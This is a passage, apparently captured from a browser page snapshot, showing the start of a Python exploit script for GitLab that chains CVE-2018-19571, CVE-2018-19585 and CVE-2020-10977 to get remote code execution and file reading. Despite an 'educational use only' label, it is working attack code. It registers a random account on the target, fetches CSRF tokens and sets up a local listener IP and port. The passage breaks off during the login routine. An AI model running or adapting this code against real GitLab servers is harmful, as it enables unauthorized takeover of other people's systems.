              - code [ref=e251]: "``` \"\"\" Gitlab RCE+LFI version <= 11.4.7, 12.4.0-12.8.1 - EDUCATIONAL USE ONLY CVEs: CVE-2018-19571 (SSRF) + CVE-2018-19585 (CRLF) CVE-2020-10977 \"\"\" import base64 import hashlib import hmac from html.parser import HTMLParser import random import string import sys import time import urllib.parse import urllib3 import requests urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning) class GitlabRCE: description = \"oopsie woopsie we made a fucky wucky a wittle fucko boingo!\" def __init__(self, gitlab_url, local_ip): self.url = gitlab_url self.local_ip = local_ip self.port = 42069 change this if the gitlab has restricted email domains self.email_domain = \"gmail.htb\" self.session = requests.session() self.username = \"\" self.password = \"\" self.projects = [] self.issues = [] def get_authenticity_token(self, url, i=-1): result = self.session.get(url, verify=False) parser = GitlabParse() token = parser.feed(result.text, i) if not token: print(\"could not get token!\") self.abort() return token def randomize(self): sequence = string.ascii_letters + string.digits random_list = random.choices(sequence, k=10) random_string = \"\".join(random_list) return random_string def register_user(self): authenticity_token = self.get_authenticity_token(self.url + \"/users/sign_in\") self.username = self.randomize() self.password = self.randomize() email = \"{}@{}\".format(self.username, self.email_domain) data = {\"new_user[email]\": email, \"new_user[email_confirmation]\": email, \"new_user[username]\": self.username, \"new_user[name]\": self.username, \"new_user[password]\": self.password, \"authenticity_token\": authenticity_token} result = self.session.post(self.url + \"/users\", data=data, verify=False) print(\"registering {}:{} - {}\".format(self.username, self.password, result.status_code)) def login_user(self): authenticity_token = self.get_authenticity_token(self.url + \"/users/sign_in\", 0) data = {\"authenticity_token\":